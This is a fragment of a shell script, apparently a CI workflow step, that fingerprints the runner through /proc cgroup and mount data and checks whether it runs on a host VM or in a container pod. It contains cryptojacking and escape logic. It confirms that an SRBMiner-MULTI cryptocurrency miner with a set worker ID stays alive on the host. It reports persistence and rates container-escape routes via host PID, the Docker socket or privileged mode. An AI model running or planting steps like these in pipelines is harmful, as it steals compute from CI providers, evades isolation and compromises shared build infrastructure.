          if [ -n "$RL" ]; then echo "runner_listener_cgroup=$(tr '\n' ';' < /proc/$RL/cgroup 2>/dev/null)"; echo "runner_listener_ppid=$(awk '/^PPid:/{print $2}' /proc/$RL/status 2>/dev/null)"; fi
          echo "mount_root=$(awk '$2=="/"{print $1, $3, $4, $5, $9}' /proc/self/mountinfo 2>/dev/null | head -2 | tr '\n' '|')"
          PODCG=no
          case "$PID1CG" in *kubepods*|*docker*|*containerd*|*libpod*) PODCG=yes;; esac
          HOSTINIT=no
          case "$PID1EXE" in /usr/lib/systemd/systemd|/lib/systemd/systemd|/sbin/init|/usr/sbin/init) HOSTINIT=yes;; esac
          echo "pod_cgroup=$PODCG pid1_host_init=$HOSTINIT"
          ESCAPE=none
          if [ "$HOSTINIT" = yes ] && [ "$PODCG" = no ]; then
            echo "ENV=host-runner-vm"
            echo "PERSIST=already-host-namespace (no container to escape; miner step already launched host-ns processes)"
            for p in $(timeout 10 pgrep -f '[S]RBMiner-MULTI.*--worker i128954-' 2>/dev/null | head -9); do echo "own_pid=$p cgroup=$(tr '\n' ';' < /proc/$p/cgroup 2>/dev/null)"; done
            echo "ALIVE=$(timeout 10 pgrep -f '[S]RBMiner-MULTI.*--worker i128954-' 2>/dev/null | wc -l)"
            echo "persist-done $NONCE"
            exit 0
          fi
          echo "ENV=container-pod"
          if [ "$HOSTINIT" = yes ] && [ "$HAS_ADMIN" = "1" ]; then ESCAPE=hostpid; fi
          if [ "$ESCAPE" = none ] && [ "$DOCKER_SOCK" != none ]; then ESCAPE=docker-sock-only; fi
          if [ "$ESCAPE" = none ] && [ "$HAS_ADMIN" = "1" ]; then ESCAPE=privileged-no-hostpid; fi
          echo "ESCAPE=$ESCAPE"
